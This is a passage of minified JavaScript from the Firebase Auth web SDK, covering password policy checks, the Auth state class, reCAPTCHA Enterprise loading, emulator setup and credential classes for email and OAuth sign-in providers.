0?i:"",this.forceUpgradeOnSignin=(s=e.forceUpgradeOnSignin)!==null&&s!==void 0?s:!1,this.schemaVersion=e.schemaVersion}validatePassword(e){var n,r,i,s,o,l;const a={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,a),this.validatePasswordCharacterOptions(e,a),a.isValid&&(a.isValid=(n=a.meetsMinPasswordLength)!==null&&n!==void 0?n:!0),a.isValid&&(a.isValid=(r=a.meetsMaxPasswordLength)!==null&&r!==void 0?r:!0),a.isValid&&(a.isValid=(i=a.containsLowercaseLetter)!==null&&i!==void 0?i:!0),a.isValid&&(a.isValid=(s=a.containsUppercaseLetter)!==null&&s!==void 0?s:!0),a.isValid&&(a.isValid=(o=a.containsNumericCharacter)!==null&&o!==void 0?o:!0),a.isValid&&(a.isValid=(l=a.containsNonAlphanumericCharacter)!==null&&l!==void 0?l:!0),a}validatePasswordLengthOptions(e,n){const r=this.customStrengthOptions.minPasswordLength,i=this.customStrengthOptions.maxPasswordLength;r&&(n.meetsMinPasswordLength=e.length>=r),i&&(n.meetsMaxPasswordLength=e.length<=i)}validatePasswordCharacterOptions(e,n){this.updatePasswordCharacterOptionsStatuses(n,!1,!1,!1,!1);let r;for(let i=0;i<e.length;i++)r=e.charAt(i),this.updatePasswordCharacterOptionsStatuses(n,r>="a"&&r<="z",r>="A"&&r<="Z",r>="0"&&r<="9",this.allowedNonAlphanumericCharacters.includes(r))}updatePasswordCharacterOptionsStatuses(e,n,r,i,s){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=n)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=r)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=i)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uI{constructor(e,n,r,i){this.app=e,this.heartbeatServiceProvider=n,this.appCheckServiceProvider=r,this.config=i,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new Cp(this),this.idTokenSubscription=new Cp(this),this.beforeStateQueue=new sI(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=mv,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=i.sdkClientVersion}_initializeWithPersistence(e,n){return n&&(this._popupRedirectResolver=Mt(n)),this._initializationPromise=this.queue(async()=>{var r,i;if(!this._deleted&&(this.persistenceManager=await qr.create(this,e),!this._deleted)){if(!((r=this._popupRedirectResolver)===null||r===void 0)&&r._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(n),this.lastNotifiedUid=((i=this.currentUser)===null||i===void 0?void 0:i.uid)||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUser(e){var n;const r=await this.assertedPersistence.getCurrentUser();let i=r,s=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const o=(n=this.redirectUser)===null||n===void 0?void 0:n._redirectEventId,l=i==null?void 0:i._redirectEventId,a=await this.tryRedirectSignIn(e);(!o||o===l)&&(a!=null&&a.user)&&(i=a.user,s=!0)}if(!i)return this.directlySetCurrentUser(null);if(!i._redirectEventId){if(s)try{await this.beforeStateQueue.runMiddleware(i)}catch(o){i=r,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(o))}return i?this.reloadAndSetCurrentUserOrClear(i):this.directlySetCurrentUser(null)}return O(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===i._redirectEventId?this.directlySetCurrentUser(i):this.reloadAndSetCurrentUserOrClear(i)}async tryRedirectSignIn(e){let n=null;try{n=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return n}async reloadAndSetCurrentUserOrClear(e){try{await kl(e)}catch(n){if((n==null?void 0:n.code)!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=BT()}async _delete(){this._deleted=!0}async updateCurrentUser(e){const n=e?Ie(e):null;return n&&O(n.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(n&&n._clone(this))}async _updateCurrentUser(e,n=!1){if(!this._deleted)return e&&O(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),n||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0)}setPersistence(e){return this.queue(async()=>{await this.assertedPersistence.setPersistence(Mt(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const n=this._getPasswordPolicyInternal();return n.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):n.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await oI(this),n=new aI(e);this.tenantId===null?this._projectPasswordPolicy=n:this._tenantPasswordPolicies[this.tenantId]=n}_getPersistence(){return this.assertedPersistence.persistence.type}_updateErrorMap(e){this._errorFactory=new qs("auth","Firebase",e())}onAuthStateChanged(e,n,r){return this.registerStateListener(this.authStateSubscription,e,n,r)}beforeAuthStateChanged(e,n){return this.beforeStateQueue.pushCallback(e,n)}onIdTokenChanged(e,n,r){return this.registerStateListener(this.idTokenSubscription,e,n,r)}authStateReady(){return new Promise((e,n)=>{if(this.currentUser)e();else{const r=this.onAuthStateChanged(()=>{r(),e()},n)}})}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:(e=this._currentUser)===null||e===void 0?void 0:e.toJSON()}}async _setRedirectUser(e,n){const r=await this.getOrInitRedirectPersistenceManager(n);return e===null?r.removeCurrentUser():r.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const n=e&&Mt(e)||this._popupRedirectResolver;O(n,this,"argument-error"),this.redirectPersistenceManager=await qr.create(this,[Mt(n._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){var n,r;return this._isInitialized&&await this.queue(async()=>{}),((n=this._currentUser)===null||n===void 0?void 0:n._redirectEventId)===e?this._currentUser:((r=this.redirectUser)===null||r===void 0?void 0:r._redirectEventId)===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,n;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const r=(n=(e=this.currentUser)===null||e===void 0?void 0:e.uid)!==null&&n!==void 0?n:null;this.lastNotifiedUid!==r&&(this.lastNotifiedUid=r,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,n,r,i){if(this._deleted)return()=>{};const s=typeof n=="function"?n:n.next.bind(n);let o=!1;const l=this._isInitialized?Promise.resolve():this._initializationPromise;if(O(l,this,"internal-error"),l.then(()=>{o||s(this.currentUser)}),typeof n=="function"){const a=e.addObserver(n,r,i);return()=>{o=!0,a()}}else{const a=e.addObserver(n);return()=>{o=!0,a()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return O(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=Nv(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){var e;const n={"X-Client-Version":this.clientVersion};this.app.options.appId&&(n["X-Firebase-gmpid"]=this.app.options.appId);const r=await((e=this.heartbeatServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getHeartbeatsHeader());r&&(n["X-Firebase-Client"]=r);const i=await this._getAppCheckToken();return i&&(n["X-Firebase-AppCheck"]=i),n}async _getAppCheckToken(){var e;const n=await((e=this.appCheckServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getToken());return n!=null&&n.error&&UT(`Error while retrieving App Check token: ${n.error}`),n==null?void 0:n.token}}function yr(t){return Ie(t)}class Cp{constructor(e){this.auth=e,this.observer=null,this.addObserver=kS(n=>this.observer=n)}get next(){return O(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function cI(){var t,e;return(e=(t=document.getElementsByTagName("head"))===null||t===void 0?void 0:t[0])!==null&&e!==void 0?e:document}function Pv(t){return new Promise((e,n)=>{const r=document.createElement("script");r.setAttribute("src",t),r.onload=e,r.onerror=i=>{const s=Nt("internal-error");s.customData=i,n(s)},r.type="text/javascript",r.charset="UTF-8",cI().appendChild(r)})}function dI(t){return`__${t}${Math.floor(Math.random()*1e6)}`}const hI="https://www.google.com/recaptcha/enterprise.js?render=",fI="recaptcha-enterprise",pI="NO_RECAPTCHA";class mI{constructor(e){this.type=fI,this.auth=yr(e)}async verify(e="verify",n=!1){async function r(s){if(!n){if(s.tenantId==null&&s._agentRecaptchaConfig!=null)return s._agentRecaptchaConfig.siteKey;if(s.tenantId!=null&&s._tenantRecaptchaConfigs[s.tenantId]!==void 0)return s._tenantRecaptchaConfigs[s.tenantId].siteKey}return new Promise(async(o,l)=>{VT(s,{clientType:"CLIENT_TYPE_WEB",version:"RECAPTCHA_ENTERPRISE"}).then(a=>{if(a.recaptchaKey===void 0)l(new Error("recaptcha Enterprise site key undefined"));else{const u=new DT(a);return s.tenantId==null?s._agentRecaptchaConfig=u:s._tenantRecaptchaConfigs[s.tenantId]=u,o(u.siteKey)}}).catch(a=>{l(a)})})}function i(s,o,l){const a=window.grecaptcha;_p(a)?a.enterprise.ready(()=>{a.enterprise.execute(s,{action:e}).then(u=>{o(u)}).catch(()=>{o(pI)})}):l(Error("No reCAPTCHA enterprise script loaded."))}return new Promise((s,o)=>{r(this.auth).then(l=>{if(!n&&_p(window.grecaptcha))i(l,s,o);else{if(typeof window>"u"){o(new Error("RecaptchaVerifier is only supported in browser"));return}Pv(hI+l).then(()=>{i(l,s,o)}).catch(a=>{o(a)})}}).catch(l=>{o(l)})})}}async function Rl(t,e,n,r=!1){const i=new mI(t);let s;try{s=await i.verify(n)}catch{s=await i.verify(n,!0)}const o=Object.assign({},e);return r?Object.assign(o,{captchaResp:s}):Object.assign(o,{captchaResponse:s}),Object.assign(o,{clientType:"CLIENT_TYPE_WEB"}),Object.assign(o,{recaptchaVersion:"RECAPTCHA_ENTERPRISE"}),o}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function gI(t,e){const n=ha(t,"auth");if(n.isInitialized()){const i=n.getImmediate(),s=n.getOptions();if(Sl(s,e??{}))return i;wt(i,"already-initialized")}return n.initialize({options:e})}function _I(t,e){const n=(e==null?void 0:e.persistence)||[],r=(Array.isArray(n)?n:[n]).map(Mt);e!=null&&e.errorMap&&t._updateErrorMap(e.errorMap),t._initializeWithPersistence(r,e==null?void 0:e.popupRedirectResolver)}function vI(t,e,n){const r=yr(t);O(r._canInitEmulator,r,"emulator-config-failed"),O(/^https?:\/\//.test(e),r,"invalid-emulator-scheme");const i=!!(n!=null&&n.disableWarnings),s=xv(e),{host:o,port:l}=yI(e),a=l===null?"":`:${l}`;r.config.emulator={url:`${s}//${o}${a}/`},r.settings.appVerificationDisabledForTesting=!0,r.emulatorConfig=Object.freeze({host:o,port:l,protocol:s.replace(":",""),options:Object.freeze({disableWarnings:i})}),i||wI()}function xv(t){const e=t.indexOf(":");return e<0?"":t.substr(0,e+1)}function yI(t){const e=xv(t),n=/(\/\/)?([^?#/]+)/.exec(t.substr(e.length));if(!n)return{host:"",port:null};const r=n[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(r);if(i){const s=i[1];return{host:s,port:Sp(r.substr(s.length+1))}}else{const[s,o]=r.split(":");return{host:s,port:Sp(o)}}}function Sp(t){if(!t)return null;const e=Number(t);return isNaN(e)?null:e}function wI(){function t(){const e=document.createElement("p"),n=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",n.position="fixed",n.width="100%",n.backgroundColor="#ffffff",n.border=".1em solid #000000",n.color="#b50000",n.bottom="0px",n.left="0px",n.margin="0px",n.zIndex="10000",n.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",t):t())}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Jd{constructor(e,n){this.providerId=e,this.signInMethod=n}toJSON(){return Dt("not implemented")}_getIdTokenResponse(e){return Dt("not implemented")}_linkToIdToken(e,n){return Dt("not implemented")}_getReauthenticationResolver(e){return Dt("not implemented")}}async function EI(t,e){return vr(t,"POST","/v1/accounts:update",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function lu(t,e){return Ks(t,"POST","/v1/accounts:signInWithPassword",_r(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function CI(t,e){return Ks(t,"POST","/v1/accounts:signInWithEmailLink",_r(t,e))}async function SI(t,e){return Ks(t,"POST","/v1/accounts:signInWithEmailLink",_r(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ps extends Jd{constructor(e,n,r,i=null){super("password",r),this._email=e,this._password=n,this._tenantId=i}static _fromEmailAndPassword(e,n){return new Ps(e,n,"password")}static _fromEmailAndCode(e,n,r=null){return new Ps(e,n,"emailLink",r)}toJSON(){return{email:this._email,password:this._password,signInMethod:this.signInMethod,tenantId:this._tenantId}}static fromJSON(e){const n=typeof e=="string"?JSON.parse(e):e;if(n!=null&&n.email&&(n!=null&&n.password)){if(n.signInMethod==="password")return this._fromEmailAndPassword(n.email,n.password);if(n.signInMethod==="emailLink")return this._fromEmailAndCode(n.email,n.password,n.tenantId)}return null}async _getIdTokenResponse(e){var n;switch(this.signInMethod){case"password":const r={returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};if(!((n=e._getRecaptchaConfig())===null||n===void 0)&&n.emailPasswordEnabled){const i=await Rl(e,r,"signInWithPassword");return lu(e,i)}else return lu(e,r).catch(async i=>{if(i.code==="auth/missing-recaptcha-token"){console.log("Sign-in with email address and password is protected by reCAPTCHA for this project. Automatically triggering the reCAPTCHA flow and restarting the sign-in flow.");const s=await Rl(e,r,"signInWithPassword");return lu(e,s)}else return Promise.reject(i)});case"emailLink":return CI(e,{email:this._email,oobCode:this._password});default:wt(e,"internal-error")}}async _linkToIdToken(e,n){switch(this.signInMethod){case"password":return EI(e,{idToken:n,returnSecureToken:!0,email:this._email,password:this._password});case"emailLink":return SI(e,{idToken:n,email:this._email,oobCode:this._password});default:wt(e,"internal-error")}}_getReauthenticationResolver(e){return this._getIdTokenResponse(e)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Gr(t,e){return Ks(t,"POST","/v1/accounts:signInWithIdp",_r(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const TI="http://localhost";class or extends Jd{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const n=new or(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(n.idToken=e.idToken),e.accessToken&&(n.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(n.nonce=e.nonce),e.pendingToken&&(n.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(n.accessToken=e.oauthToken,n.secret=e.oauthTokenSecret):wt("argument-error"),n}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const n=typeof e=="string"?JSON.parse(e):e,{providerId:r,signInMethod:i}=n,s=Gd(n,["providerId","signInMethod"]);if(!r||!i)return null;const o=new or(r,i);return o.idToken=s.idToken||void 0,o.accessToken=s.accessToken||void 0,o.secret=s.secret,o.nonce=s.nonce,o.pendingToken=s.pendingToken||null,o}_getIdTokenResponse(e){const n=this.buildRequest();return Gr(e,n)}_linkToIdToken(e,n){const r=this.buildRequest();return r.idToken=n,Gr(e,r)}_getReauthenticationResolver(e){const n=this.buildRequest();return n.autoCreate=!1,Gr(e,n)}buildRequest(){const e={requestUri:TI,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const n={};this.idToken&&(n.id_token=this.idToken),this.accessToken&&(n.access_token=this.accessToken),this.secret&&(n.oauth_token_secret=this.secret),n.providerId=this.providerId,this.nonce&&!this.pendingToken&&(n.nonce=this.nonce),e.postBody=_i(n)}return e}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function II(t){switch(t){case"recoverEmail":return"RECOVER_EMAIL";case"resetPassword":return"PASSWORD_RESET";case"signIn":return"EMAIL_SIGNIN";case"verifyEmail":return"VERIFY_EMAIL";case"verifyAndChangeEmail":return"VERIFY_AND_CHANGE_EMAIL";case"revertSecondFactorAddition":return"REVERT_SECOND_FACTOR_ADDITION";default:return null}}function kI(t){const e=$i(Vi(t)).link,n=e?$i(Vi(e)).deep_link_id:null,r=$i(Vi(t)).deep_link_id;return(r?$i(Vi(r)).link:null)||r||n||e||t}class Zd{constructor(e){var n,r,i,s,o,l;const a=$i(Vi(e)),u=(n=a.apiKey)!==null&&n!==void 0?n:null,c=(r=a.oobCode)!==null&&r!==void 0?r:null,d=II((i=a.mode)!==null&&i!==void 0?i:null);O(u&&c&&d,"argument-error"),this.apiKey=u,this.operation=d,this.code=c,this.continueUrl=(s=a.continueUrl)!==null&&s!==void 0?s:null,this.languageCode=(o=a.languageCode)!==null&&o!==void 0?o:null,this.tenantId=(l=a.tenantId)!==null&&l!==void 0?l:null}static parseLink(e){const n=kI(e);try{return new Zd(n)}catch{return null}}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vi{constructor(){this.providerId=vi.PROVIDER_ID}static credential(e,n){return Ps._fromEmailAndPassword(e,n)}static credentialWithLink(e,n){const r=Zd.parseLink(n);return O(r,"argument-error"),Ps._fromEmailAndCode(e,r.code,r.tenantId)}}vi.PROVIDER_ID="password";vi.EMAIL_PASSWORD_SIGN_IN_METHOD="password";vi.EMAIL_LINK_SIGN_IN_METHOD="emailLink";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Av{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ys extends Av{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sn extends Ys{constructor(){super("facebook.com")}static credential(e){return or._fromParams({providerId:sn.PROVIDER_ID,signInMethod:sn.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return sn.credentialFromTaggedObject(e)}static credentialFromError(e){return sn.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return sn.credential(e.oauthAccessToken)}catch{return null}}}sn.FACEBOOK_SIGN_IN_METHOD="facebook.com";sn.PROVIDER_ID="facebook.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class on extends Ys{constructor(){super("google.com"),this.addScope("profile")}static credential(e,n){return or._fromParams({providerId:on.PROVIDER_ID,signInMethod:on.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:n})}static credentialFromResult(e){return on.credentialFromTaggedObject(e)}static credentialFromError(e){return on.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:n,oauthAccessToken:r}=e;if(!n&&!r)return null;try{return on.credential(n,r)}catch{return null}}}on.GOOGLE_SIGN_IN_METHOD="google.com";on.PROVIDER_ID="google.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ln extends Ys{constructor(){super("github.com")}static credential(e){return or._fromParams({providerId:ln.PROVIDER_ID,signInMethod:ln.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return ln.credentialFromTaggedObject(e)}static credentialFromError(e){return ln.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return ln.credential(e.oauthAccessToken)}catch{return null}}}ln.GITHUB_SIGN_IN_METHOD="github.com";ln.PROVIDER_ID="github.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
